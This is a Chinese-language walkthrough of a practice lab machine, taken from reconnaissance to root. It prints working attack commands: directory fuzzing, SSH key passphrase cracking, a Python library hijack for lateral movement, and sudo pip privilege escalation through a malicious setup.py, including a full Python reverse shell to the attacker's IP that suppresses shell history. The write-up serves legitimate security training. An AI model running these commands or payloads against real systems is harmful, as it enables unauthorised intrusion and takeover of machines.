0X00 环境<br />**攻击机：**192.168.1.3<br />**靶机：**192.168.1.9


# 0X01 信息收集
使用[NMAP](https://www.yuque.com/xmtxsec/network_security/xm1y1f)进行端口扫描
```
nmap -sV -A 192.168.1.9 -p-
```
![image.png](../../_img\06-靶场实践/1671518059251-6c8f02a8-909e-4f85-a285-2c1fff22583c.png)
可以看到目标机只开放了两个端口。

查看一下80端口的Web页面发现是一张图片，看来一下源码也没有什么内容
![image.png](../../_img\06-靶场实践/1671518232574-cc71a869-cb69-4e5d-a992-8f55d030529e.png)
![image.png](../../_img\06-靶场实践/1671518370587-f7314e03-30e2-4897-aab8-3944afebebd7.png)

扫描以下网站目录结构
![image.png](../../_img\06-靶场实践/1671518775561-8d582d08-9593-4a96-a2fd-77f42763c393.png)

查看上面扫描出来的robots.txt文件
![image.png](../../_img\06-靶场实践/1671518832349-e73f50cd-dc87-43b6-b545-16fc36b7f4d7.png)
访问/~myfiles
![image.png](../../_img\06-靶场实践/1671518861928-b930a432-6cde-46ca-9ae3-f73afb50d38e.png)
![image.png](../../_img\06-靶场实践/1671518879607-d6caa165-edfe-4c20-b987-7484dc0128e9.png)

依照`/~myfiles`这个格式尝试使用[Wfuzz](https://www.yuque.com/xmtxsec/network_security/fx9xgg)进行模糊扫描<br />推荐字典：[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
```
 wfuzz -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c -u 'http://192.168.1.9/~FUZZ' --hc 404
```
![image.png](../../_img\06-靶场实践/1671520752200-5f13f2cb-a931-4770-a572-30b6235b615a.png)

在浏览器访问 [http://192.168.1.9/~secret/](http://192.168.1.9//~secret/)
![image.png](../../_img\06-靶场实践/1671520944830-4b8f7253-a801-4673-8ebe-c00f302c28b8.png)
通过这段信息我们可以知道需要找到藏在某个地方的ssh私钥文件，icex64可能是用户名。而且创建secret这个目录的原因就是为了分享他的私钥文件，但是我们并没有看到私钥文件，可以猜测私钥文件可能是在secret目录的下一级。

使用[FFUF](https://www.yuque.com/xmtxsec/network_security/phdd91qqlyq3bvb0)继续模糊测试
```
ffuf -u 'http://192.168.1.9/~secret/.FUZZ' -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -e .txt,.pub,.html,.bak -mc 200

-u    指定扫描路径
-w    指定字典
-e    指定要筛选的后缀
-mc   指定要筛选的状态码
```
![image.png](../../_img\06-靶场实践/1671522778959-429a32be-7a8d-4d8b-ae19-1c0778620e9a.png)

访问mysecret.txt，得到一串密文
![image.png](../../_img\06-靶场实践/1671522918001-8f52728b-d054-4ec3-b9c6-bbecc431e908.png)

经过多次尝试后发现使用base58解码成功
![image.png](../../_img\06-靶场实践/1671523035280-bdebc1b8-f823-4c0f-874f-f81ebb1b7fda.png)

将得到的私钥保存到ssh.txt中，并使用john生成密码本
```
/usr/share/john/ssh2john.py ssh.txt > passwd 
```
![image.png](../../_img\06-靶场实践/1671523414108-eeb7d625-d3ed-47d2-bfc1-b3ead4936fe0.png)

使用john爆破，得到密码`P@55w0rd!`
```
john --wordlist=/usr/share/wordlists/fasttrack.txt passwd
```
![image.png](../../_img\06-靶场实践/1671523500727-813ff8cd-ef2c-45b1-b321-8a4eff016166.png)

# 0X02 漏洞利用 
用上面收集到的账号`icex64`和密码`P@55w0rd!`连接SSH
```
ssh icex64@192.168.1.9 -i
```
![image.png](../../_img\06-靶场实践/1671524519880-84c9274f-930d-49ef-a672-982406ef85a5.png)

成功登陆，查看user.txt文件
![image.png](../../_img\06-靶场实践/1671524698410-ca7af7ce-5680-4429-813c-b377907236c1.png)


# 0X03 横向移动
查看当前用户拥有的权限
```
sudo -l
```
![image.png](../../_img\06-靶场实践/1671524820737-50515b42-f98a-4aed-abe1-4d81572fe60e.png)
 有一个arsene免密，还给出了一个python文件的路径。

查看一下这个python文件，发现调用了webbrowser
```
cat /home/arsene/heist.py
```
![image.png](../../_img\06-靶场实践/1671524948401-d01e907b-2d68-4749-87ab-30dc5c9628d1.png)

查找一下webbrowser
```
find /usr -name *webbrowser*
```
![image.png](../../_img\06-靶场实践/1671525279423-0adccfb1-1e0a-4bd3-b761-a0eb560afeb4.png)

查看该文件的权限
```
ls -l /usr/lib/python3.9/webbrowser.py
```
![image.png](../../_img\06-靶场实践/1671525387870-efc84161-596b-4f5e-8f43-3c39be8f7989.png)
具有root权限且当前用户具有编写权限

因为当前用户对webbrowser.py具有编写权限，因此在该文件中写入shell
```
os.system("/bin/bash")
```
![image.png](../../_img\06-靶场实践/1671525889919-b6c607f6-2895-4308-8602-3aa0a440427a.png)

用 arsene 调用 /home/arsene/heist.py，获取arsene权限
```
sudo -u arsene python3.9 /home/arsene/heist.py
```
![image.png](../../_img\06-靶场实践/1671525928826-4b6d259b-57d3-4bba-be52-5f29408db50b.png)

查看 arsene 用户拥有的权限
```
sudo -l
```
![image.png](../../_img\06-靶场实践/1671526003023-46c175a0-d542-43f9-bd1b-f3d9f9b70062.png)
pip命令不需要root密码即可执行


# 0X04 利用pip提权

## 方法一
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
同等于
```
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo pip install .
```
成功得到toot权限
![image.png](../../_img\06-靶场实践/1671526741086-9aaea337-94ed-4cd0-b0b4-08dc5f42aa1c.png)


## 方法二
本地启动监听
```
nc -tvlp 9999
```
![image.png](../../_img\06-靶场实践/1671528059147-bd1b5298-2c1f-4a87-8bdc-001b1c067020.png)

编写提权脚本setup.py
```
from setuptools import setup   #加入

def con():
	import socket, time,pty, os
	host='192.168.1.3'
	port=9999
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

setup(name="hahahaha", version="1.0")  #加入
```

将setup.py上传到目标机
```
python2 -m SimpleHTTPServer 7777
```
![image.png](../../_img\06-靶场实践/1671527940830-2bf27237-80e6-425d-a5d4-09be4c800719.png)
```
wget http://192.168.1.3:7777/setup.py
```
![image.png](../../_img\06-靶场实践/1671527984893-2b03e4bc-e466-4ba5-a062-18d5ea57d325.png)

在靶机上执行
```
sudo /usr/bin/pip install . --upgrade --force-reinstall
```

成功反弹shell
![image.png](../../_img\06-靶场实践/1671527667637-dd81ec67-7d15-4b1c-a803-e4b17e793b80.png)


来到root目录下成功得到flag
![image.png](../../_img\06-靶场实践/1671526919472-128e9f27-ccf6-431c-9a3c-a917c8dd1738.png)
